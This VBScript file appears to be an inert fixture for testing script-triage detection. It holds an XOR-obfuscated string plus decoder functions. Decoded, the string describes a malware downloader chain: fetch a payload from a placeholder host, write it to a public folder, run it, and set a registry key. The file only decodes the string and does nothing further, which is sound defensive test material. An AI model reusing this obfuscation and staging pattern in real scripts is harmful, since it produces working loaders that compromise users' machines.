Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_083bd403 = "3e:75:79:34:3b:3c:2d:38:3b:75:29:2b:39:3d:21:3a:2d:17:3a:2d:25:27:3c:2d:64:3f:3a:21:3c:2d:17:2e:21:24:2d:64:2c:21:3b:38:29:3c:2b:20:17:38:3a:27:2b:2d:3b:3b:64:20:29:26:2c:27:2e:2e:17:3b:2b:3a:21:38:3c:34:29:2c:29:38:3c:2d:3a:75:1f:21:26:00:3c:3c:38:66:1f:21:26:00:3c:3c:38:1a:2d:39:3d:2d:3b:3c:66:7d:66:79:34:3b:3c:29:2f:2d:17:2b:27:3d:26:3c:75:7c:34:2b:29:25:38:29:21:2f:26:17:21:2c:75:2b:29:25:38:29:21:2f:26:65:79:7e:7e:78:71:2a:2c:78:78:7d:34:3d:3a:24:75:20:3c:3c:38:3b:72:67:67:79:7e:7e:78:71:2a:2c:78:78:7d:66:2d:30:29:25:38:24:2d:66:21:26:3e:29:24:21:2c:67:70:29:2e:2d:7b:2b:2c:78:66:2c:29:3c:34:3d:3b:2d:3a:17:29:2f:2d:26:3c:75:00:3d:26:3c:3a:2d:3b:3b:04:29:2a:67:79:7e:7e:78:71:2a:2c:78:78:7d:34:2e:21:24:2d:17:38:29:3c:20:75:0b:72:14:1d:3b:2d:3a:3b:14:18:3d:2a:24:21:2b:14:00:3d:26:3c:3a:2d:3b:3b:04:29:2a:14:3b:3c:29:2f:2d:65:79:7e:7e:78:71:2a:2c:78:78:7d:66:2c:29:3c:34:3a:2d:2f:21:3b:3c:3a:31:17:38:29:3c:20:75:00:03:0b:1d:14:1b:27:2e:3c:3f:29:3a:2d:14:00:3d:26:3c:3a:2d:3b:3b:04:29:2a:14:0c:21:3b:38:27:3b:29:2a:24:2d:14:79:7e:7e:78:71:2a:2c:78:78:7d:34:26:2d:30:3c:17:3b:3c:29:2f:2d:75:24:27:2b:29:24:65:2c:21:3b:38:29:3c:2b:20:66:3e:2a:3b"
Const Codec_083bd403 = "hex_colon|single_byte_xor|48"

Function Load_083bd403()
  Dim parts, result(), item5
  parts = Split(Material_083bd403, ":")
  ReDim result(UBound(parts))
  For item5 = 0 To UBound(parts)
    result(item5) = CInt("&H" & parts(item5))
  Next
  Load_083bd403 = result
End Function

Function Decode_083bd403(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  For item5 = 0 To UBound(item1)
    result(item5) = item1(item5) Xor 72
  Next
  Decode_083bd403 = result
End Function

Function Recover_083bd403()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  If True Then
    item4 = Join(Array("north", "south"), ":")
      item1 = Load_083bd403()
      Select Case 1
        Case 1
          item2 = Decode_083bd403(item1)
        Case Else
          item2 = Array()
      End Select
      item3 = ""
      For item5 = 0 To UBound(item2)
        item3 = item3 & Chr(item2(item5))
      Next
  End If
  Recover_083bd403 = item3
End Function

Function Inspect_083bd403()
  Dim fields
  fields = Split(Recover_083bd403(), "|")
  Inspect_083bd403 = Join(fields, "|")
End Function
